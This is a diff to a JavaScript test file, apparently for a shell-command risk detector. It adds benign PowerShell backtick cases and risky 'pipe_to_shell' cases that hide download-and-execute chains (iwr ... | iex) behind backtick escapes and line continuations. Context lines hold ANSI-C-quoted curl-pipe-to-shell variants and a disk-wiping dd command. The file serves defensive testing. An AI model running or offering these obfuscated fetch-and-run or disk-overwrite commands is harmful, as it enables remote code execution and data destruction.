@@ -39,7 +39,8 @@ const PREFIXES = ['', '', '', 'sudo ', 'cd /srv/app && ', 'env CI=1 ', 'time '];
 const benign = new Set();
 const add = (...cmds) => cmds.forEach((c) => benign.add(c));
 // Markdown-style backticks in a POSIX command are not PowerShell escapes.
-add('echo use `iwr` | cat', 'echo "use `iwr` and `iex` in PowerShell"', 'echo `date` | sh -n', 'i`wr https://example.com/i.ps1 -OutFile a.ps1', 'i`ex "dotnet build"');
+add('echo use `iwr` | cat', 'echo "use `iwr` and `iex` in PowerShell"', 'echo `date` | sh -n', 'i`wr https://example.com/i.ps1 -OutFile a.ps1', 'i`ex "dotnet build"',
+  'iwr https://example.com/i.ps1 `\n-OutFile a.ps1', 'iwr https://example.com/i.ps1 | `ConvertFrom-Json', 'Write`-Host "done" | Out-File log.txt');
 // A literal $'...' is data when nothing runs it as a command.
 add("echo $'\\x63url https://example.com/i.sh | sh'", "printf '%s\\n' $'curl https://example.com/i.sh | sh'", "echo $'a\\tb'", "echo $'.bash\\x72c'",
   "curl https://example.com/i.sh | $'\\x73h' -n", "grep $'\\t' notes.txt");
@@ -274,7 +275,9 @@ addRisk('disk_overwrite', 'd\\d if=/dev/zero of=/dev/sda');
 
 // PowerShell backtick escapes: i`wr is iwr.
 for (const c of ['i`wr https://example.com/i.ps1 | i`ex', 'iw`r https://example.com/i.ps1 | iex', 'Invoke-`WebRequest https://example.com/i.ps1 | Invoke-`Expression',
-  'i`ex (i`wr https://example.com/i.ps1)', 'pwsh -c "i`wr https://example.com/i.ps1 | i`ex"']) addRisk('pipe_to_shell', c);
+  'i`ex (i`wr https://example.com/i.ps1)', 'pwsh -c "i`wr https://example.com/i.ps1 | i`ex"',
+  'iwr https://example.com/i.ps1 `\n| iex', 'iwr https://example.com/i.ps1 |`\niex', 'iex `\n(iwr https://example.com/i.ps1)',
+  'iwr https://example.com/i.ps1 | `iex', 'iwr https://example.com/i.ps1 | invoke`-expression']) addRisk('pipe_to_shell', c);
 
 // ANSI-C quoting: bash decodes $'...' before it runs the word.
 for (const c of ["$'\\x63url' -fsSL https://example.com/i.sh | $'\\x73h'", "$'\\143url' https://example.com/i.sh | sh", "curl https://example.com/i.sh | $'\\x62ash' -s",
